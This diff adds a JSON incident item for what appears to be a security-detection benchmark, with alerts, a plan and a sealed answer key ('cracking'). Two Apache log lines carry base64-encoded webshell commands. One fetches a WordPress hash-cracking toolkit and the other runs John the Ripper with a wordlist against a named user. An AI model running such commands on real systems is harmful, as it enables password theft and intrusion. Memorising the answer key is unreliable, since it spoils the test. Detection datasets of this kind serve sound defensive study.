@@ -1,0 +1,219 @@
+{
+  "incident_id": "ait-harrison-cracking",
+  "name": "AIT-ADS harrison/cracking",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "harrison/cracking",
+  "alert": {
+    "timestamp": "2022-02-08T07:56:37Z",
+    "host": "harrison",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-02-08T07:56:37Z",
+    "end": "2022-02-08T08:00:37Z",
+    "hosts": [
+      "harrison"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-0ae1d981",
+        "timestamp": "2022-02-08T07:56:37Z",
+        "host": "harrison",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306997.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-9f6972af",
+        "timestamp": "2022-02-08T07:57:06Z",
+        "host": "harrison",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:57:06 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandhcmQiXQ%3D%3D HTTP/1.1\" 200 506895 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644307026.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:57:06 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandhcmQiXQ%3D%3D HTTP/1.1\" 200 506895 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-9b27d454",
+        "timestamp": "2022-02-08T07:58:16Z",
+        "host": "harrison",
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"ecs\":{\"version\":\"1.9.0\"},\"@timestamp\":\"2022-02-08T07:58:16.130Z\",\"system\":{\"cpu\":{\"nice\":{\"pct\":0.9284,\"norm\":{\"pct\":0.9284}},\"idle\":{\"pct\":0,\"norm\":{\"pct\":0}},\"steal\":{\"pct\":0.0018,\"norm\":{\"pct\":0.0018}},\"system\":{\"pct\":0.0385,\"norm\":{\"pct\":0.0385}},\"user\":{\"pct\":0.0305,\"norm\":{\"pct\":0.0305}},\"irq\":{\"pct\":0,\"norm\":{\"pct\":0}},\"softirq\":{\"pct\":9.0E-4,\"norm\":{\"pct\":9.0E-4}},\"total\":{\"pct\":1,\"norm\":{\"pct\":1}},\"cores\":1,\"iowait\":{\"pct\":0,\"norm\":{\"pct\":0}}}},\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"module\":\"system\",\"duration\":556001,\"dataset\":\"system.cpu\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"service\":{\"type\":\"system\"},\"agent\":{\"id\":\"5678ad34-b8df-4530-b464-514bae7f8c23\",\"hostname\":\"intranet-server\",\"name\":\"intranet-server\",\"version\":\"7.13.2\",\"type\":\"metricbeat\",\"ephemeral_id\":\"a46565ab-4cd1-4805-9d31-9e7b3aff2b8a\"},\"@version\":\"1\"}",
+        "raw_alert": {
+          "timestamp": 1644307096.13,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"ecs\":{\"version\":\"1.9.0\"},\"@timestamp\":\"2022-02-08T07:58:16.130Z\",\"system\":{\"cpu\":{\"nice\":{\"pct\":0.9284,\"norm\":{\"pct\":0.9284}},\"idle\":{\"pct\":0,\"norm\":{\"pct\":0}},\"steal\":{\"pct\":0.0018,\"norm\":{\"pct\":0.0018}},\"system\":{\"pct\":0.0385,\"norm\":{\"pct\":0.0385}},\"user\":{\"pct\":0.0305,\"norm\":{\"pct\":0.0305}},\"irq\":{\"pct\":0,\"norm\":{\"pct\":0}},\"softirq\":{\"pct\":9.0E-4,\"norm\":{\"pct\":9.0E-4}},\"total\":{\"pct\":1,\"norm\":{\"pct\":1}},\"cores\":1,\"iowait\":{\"pct\":0,\"norm\":{\"pct\":0}}}},\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"module\":\"system\",\"duration\":556001,\"dataset\":\"system.cpu\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"service\":{\"type\":\"system\"},\"agent\":{\"id\":\"5678ad34-b8df-4530-b464-514bae7f8c23\",\"hostname\":\"intranet-server\",\"name\":\"intranet-server\",\"version\":\"7.13.2\",\"type\":\"metricbeat\",\"ephemeral_id\":\"a46565ab-4cd1-4805-9d31-9e7b3aff2b8a\"},\"@version\":\"1\"}"
+        }
+      },
+      {
+        "event_id": "ait-0004-2664ece6",
+        "timestamp": "2022-02-08T08:00:37Z",
+        "host": "harrison",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "172.28.195.222 - - [08/Feb/2022:08:00:37 +0000] \"POST /services/ajax.php/imp/sendMessage HTTP/1.1\" 200 669 \"https://mailserver.smith.harrison.com/imp/dynamic.php?page=compose&type=new&token=PsR5lrYPm2Rc-qQ_DLH7-Vv&uniq=1644307126823\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4692.71 Safari/537.36\"",
+        "raw_alert": {
+          "timestamp": 1644307237.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "172.28.195.222 - - [08/Feb/2022:08:00:37 +0000] \"POST /services/ajax.php/imp/sendMessage HTTP/1.1\" 200 669 \"https://mailserver.smith.harrison.com/imp/dynamic.php?page=compose&type=new&token=PsR5lrYPm2Rc-qQ_DLH7-Vv&uniq=1644307126823\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4692.71 Safari/537.36\""
+        }
+      },
+      {
+        "event_id": "ait-0005-59fa86fa",
+        "timestamp": "2022-02-08T08:00:37Z",
+        "host": "harrison",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+        "message": "172.28.195.222 - - [08/Feb/2022:08:00:37 +0000] \"POST /services/ajax.php/imp/sendMessage HTTP/1.1\" 200 669 \"https://mailserver.smith.harrison.com/imp/dynamic.php?page=compose&type=new&token=PsR5lrYPm2Rc-qQ_DLH7-Vv&uniq=1644307126823\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4692.71 Safari/537.36\"",
+        "raw_alert": {
+          "timestamp": 1644307237.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access logs.",
+          "message": "172.28.195.222 - - [08/Feb/2022:08:00:37 +0000] \"POST /services/ajax.php/imp/sendMessage HTTP/1.1\" 200 669 \"https://mailserver.smith.harrison.com/imp/dynamic.php?page=compose&type=new&token=PsR5lrYPm2Rc-qQ_DLH7-Vv&uniq=1644307126823\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4692.71 Safari/537.36\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-0ae1d981",
+      "source": "alerts",
+      "timestamp": "2022-02-08T07:56:37Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644306997.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:56:37 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506735 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-9f6972af",
+      "source": "alerts",
+      "timestamp": "2022-02-08T07:57:06Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.237.1.238 - - [08/Feb/2022:07:57:06 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandhcmQiXQ%3D%3D HTTP/1.1\" 200 506895 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644307026.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.237.1.238 - - [08/Feb/2022:07:57:06 +0000] \"GET /wp-content/uploads/2022/02/yumzrshbwn-1644306962.5811.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandhcmQiXQ%3D%3D HTTP/1.1\" 200 506895 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-9b27d454",
+      "source": "alerts",
+      "timestamp": "2022-02-08T07:58:16Z",
+      "host": "harrison",
+      "fields": {
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"ecs\":{\"version\":\"1.9.0\"},\"@timestamp\":\"2022-02-08T07:58:16.130Z\",\"system\":{\"cpu\":{\"nice\":{\"pct\":0.9284,\"norm\":{\"pct\":0.9284}},\"idle\":{\"pct\":0,\"norm\":{\"pct\":0}},\"steal\":{\"pct\":0.0018,\"norm\":{\"pct\":0.0018}},\"system\":{\"pct\":0.0385,\"norm\":{\"pct\":0.0385}},\"user\":{\"pct\":0.0305,\"norm\":{\"pct\":0.0305}},\"irq\":{\"pct\":0,\"norm\":{\"pct\":0}},\"softirq\":{\"pct\":9.0E-4,\"norm\":{\"pct\":9.0E-4}},\"total\":{\"pct\":1,\"norm\":{\"pct\":1}},\"cores\":1,\"iowait\":{\"pct\":0,\"norm\":{\"pct\":0}}}},\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"module\":\"system\",\"duration\":556001,\"dataset\":\"system.cpu\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"service\":{\"type\":\"system\"},\"agent\":{\"id\":\"5678ad34-b8df-4530-b464-514bae7f8c23\",\"hostname\":\"intranet-server\",\"name\":\"intranet-server\",\"version\":\"7.13.2\",\"type\":\"metricbeat\",\"ephemeral_id\":\"a46565ab-4cd1-4805-9d31-9e7b3aff2b8a\"},\"@version\":\"1\"}",
+        "raw_alert": {
+          "timestamp": 1644307096.13,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"ecs\":{\"version\":\"1.9.0\"},\"@timestamp\":\"2022-02-08T07:58:16.130Z\",\"system\":{\"cpu\":{\"nice\":{\"pct\":0.9284,\"norm\":{\"pct\":0.9284}},\"idle\":{\"pct\":0,\"norm\":{\"pct\":0}},\"steal\":{\"pct\":0.0018,\"norm\":{\"pct\":0.0018}},\"system\":{\"pct\":0.0385,\"norm\":{\"pct\":0.0385}},\"user\":{\"pct\":0.0305,\"norm\":{\"pct\":0.0305}},\"irq\":{\"pct\":0,\"norm\":{\"pct\":0}},\"softirq\":{\"pct\":9.0E-4,\"norm\":{\"pct\":9.0E-4}},\"total\":{\"pct\":1,\"norm\":{\"pct\":1}},\"cores\":1,\"iowait\":{\"pct\":0,\"norm\":{\"pct\":0}}}},\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"module\":\"system\",\"duration\":556001,\"dataset\":\"system.cpu\"},\"tags\":[\"beats_input_raw_event\"],\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"service\":{\"type\":\"system\"},\"agent\":{\"id\":\"5678ad34-b8df-4530-b464-514bae7f8c23\",\"hostname\":\"intranet-server\",\"name\":\"intranet-server\",\"version\":\"7.13.2\",\"type\":\"metricbeat\",\"ephemeral_id\":\"a46565ab-4cd1-4805-9d31-9e7b3aff2b8a\"},\"@version\":\"1\"}"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "harrison"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "harrison"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on harrison. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "harrison/cracking",
+    "answer": "cracking",
+    "accept": [
+      "cracking",
+      "cracking"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
